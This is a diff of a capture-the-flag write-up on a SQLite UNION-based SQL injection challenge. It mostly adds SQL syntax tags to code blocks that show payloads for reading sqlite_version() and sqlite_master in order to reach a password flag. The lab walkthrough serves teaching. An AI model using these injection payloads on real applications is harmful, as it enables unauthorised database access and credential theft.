@@ -16,7 +16,7 @@ Reading the source code, we can see that the database being used is SQLite and o
 
 ![3](https://github.com/Kunull/Write-ups/assets/110326359/1742de8f-980c-4496-86c4-342d14b2d981)
 
-```
+```sql
 SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1
 ```
 
@@ -27,8 +27,8 @@ In order to retrieve the flag, we first need to retrieve the table name. We can 
 
 The SQLite version can be retrieved using the following query:
 
-```
-select sqlite_version();
+```sql
+SELECT sqlite_version();
 ```
 
 Since the original `SELECT` statement selects two columns, we need to do the same in our `UNION` query.
@@ -41,7 +41,7 @@ If we provide the following input:
 
 The resultant query will be:
 
-```
+```sql
 SELECT id,username FROM users WHERE id=1 UNION SELECT Null, sqlite_version(); LIMIT 1
 ```
 
@@ -53,7 +53,7 @@ The version of SQLite being used is `3.27.2`.
 
 For SQLite versions `3.33.0` and previous, the `sqlite_master` table contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.
 
-```
+```sql
 SELECT sql FROM sqlite_master
 ```
 
@@ -65,7 +65,7 @@ If we provide the following input:
 
 The resultant query becomes:
 
-```
+```sql
 SELECT id,username FROM users WHERE id=1 UNION SELECT Null, sql FROM sqlite_master; LIMIT 1
 ```
 
@@ -75,7 +75,7 @@ There is a `users` table which has three columns: `id`, `username` and `password
 
 ### Retrieving the flag
 
-Now that we know the table name is `table2652065454664187289`, we can easily retrieve the password from the table.
+Now that we know the table name is `users`, we can easily retrieve the password from the table.
 
 If we provide the following input:
 
